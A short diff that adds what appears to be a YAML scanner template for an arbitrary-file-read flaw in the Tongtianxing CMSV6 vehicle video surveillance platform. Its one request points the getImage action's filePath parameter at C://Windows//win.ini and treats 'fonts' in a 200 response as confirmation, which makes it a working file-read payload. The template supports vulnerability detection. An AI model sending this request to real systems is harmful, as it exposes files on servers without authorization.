@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: 通天星CMSV6车载视频监控平台 getImage 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100
+  headers:
+response1:
+  body: fonts
+  code: 200
+requests2:
+response2:
